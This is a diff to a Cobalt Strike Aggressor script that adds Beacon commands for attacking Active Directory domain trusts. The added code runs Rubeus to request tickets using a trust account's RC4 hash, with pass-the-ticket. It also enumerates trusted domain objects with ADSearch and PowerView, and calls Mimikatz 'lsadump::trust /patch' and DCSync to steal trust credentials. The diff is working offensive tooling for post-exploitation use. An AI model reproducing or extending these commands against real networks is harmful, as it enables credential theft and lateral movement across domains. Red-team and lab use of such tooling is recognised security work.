@@ -695,6 +695,7 @@ alias adcs_findcas {
 }
 beacon_command_register(
     "adcs_findcas",
+    "Find the Certificate Authority Server",
     "Find the Certificate Authority Server"
 );
 
@@ -704,6 +705,7 @@ alias adcs_checktempaltes{
 }
 beacon_command_register(
     "adcs_checktempaltes",
+    "Look for vulnerable ADCS templates",
     "Look for vulnerable ADCS templates"
 );
 
@@ -1950,4 +1952,109 @@ beacon_command_register(
     . "trust_diamondticket [ticket user] [ticket user RID] [groupscsv] [history SID] [krbkey(aes256)] (ptt)\n\n"
     . "Enternprise Admin Example:\n"
     . "Administrator 500 519 S-1-5-21-2594061375-675613155-814674916-519 <key>\n"
+)
+
+alias trust_asktgt_1wout {
+    $size = size(@_);
+    if ($size >= 4) {
+        $fdomain  = @_[1];
+        $fuser    = @_[2];
+        $tdorc4   = @_[3];
+
+        $parameters = "asktgt"
+        . " /domain:" . $fdomain
+        . " /user:" . $fuser
+        . " /rc4:" . $tdorc4
+        . " /nowrap";
+
+        if ($ptt ismatch 'ptt') { $parameters = $parameters . ' /ptt'; }
+    } else {
+        berror($1, "Invalid Parameters");
+        return;
+    }
+    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
+}
+beacon_command_register (
+    "trust_asktgt_1wout",
+    "Use Rubeus to create to a TGT for a one-way outbound trust domain",
+    "Use Rubeus to create to a TGT for a one-way outbound trust domain\n\n"
+    . "Usage: trust_asktgt_1wout [forgein domain] [foreign user] [TDO RC4 Hash] (ptt)"
+)
+alias trust_findtdo {
+    $size = size(@_);
+    if ($size == 2) {
+        $domain  = @_[1];
+
+        $parameters =  '--search'
+        . ' "(objectCategory=trustedDomain)"'
+        . " --domain " . $domain
+        . ' --attributes distinguishedName,name,flatName,trustDirection';
+    } else {
+        berror($1, "Invalid Parameters");
+        return;
+    }
+    bexecute_assembly($1, $ADSEARCH_PATH, $parameters);
+}
+beacon_command_register(
+    "trust_findtdo",
+    "Use ADSearch to find Trust Domain Objects",
+    "Use ADSearch to find Trust Domain Objects\n\n"
+    . "Usage: trust_findtdo [target domain]\n"
+)
+alias trust_gettdoguid {
+    local('$handle $script $oneliner');
+    $size = size(@_);
+    if ( $size == 2) {
+        $dn = @_[1];
+        $command = 'Get-DomainObject'
+        . ' -Identity "' . $dn
+        . '" | select objectGuid';
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    #import the script
+    $handle = openf($POWERVIEW_PATH);
+    $script = readb($handle, -1);
+    closef($handle);
+
+    #send script to beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    bpowerpick($1, $command, $oneliner);
+}
+beacon_command_register(
+    "trust_gettdoguid",
+    "Use PowerView to convert the DN to ObjectGuid",
+    "Use PowerView to convert the DN to ObjectGuid\n\n"
+    . "Usage: trust_gettdoguid [TDO DN]\n"
+)
+alias trust_stealtdocreds {
+    $size = size(@_);
+    $option = @_[1];
+    if ($size == 2 && $option ismatch 'lsadump' ) {
+        $command =  'lsadump::trust /patch';
+    } else if ($size == 4 && $option ismatch 'dcsync') {
+        $domain  = @_[2];
+        $guid    = @_[3];
+        $command =  '@lsadump::dcsync'
+        . ' /domain:' . $domain
+        . ' /guid:{' . $guid
+        . '}';
+        
+    } else {
+        berror($1, "Invalid Parameters");
+        return;
+    }
+    bmimikatz($1, $command);
+}
+beacon_command_register(
+    "trust_stealtdocreds",
+    "Use Mimikatz to steal Trust Domain Object Credentials",
+    "Use Mimikatz to steal Trust Domain Object Credentials\n\n"
+    . "Usage:\n"
+    . "  trust_stealtdocreds lsadump\n"
+    . "  trust_stealtdocreds dcsync [Target Domain] [TDO GUID]\n\n"
+    . "Example:\n"
+    . "  trust_stealtdocreds dcsync cyberbotic.io b93d2e36-48df-46bf-89d5-2fc22c139b43"
 )
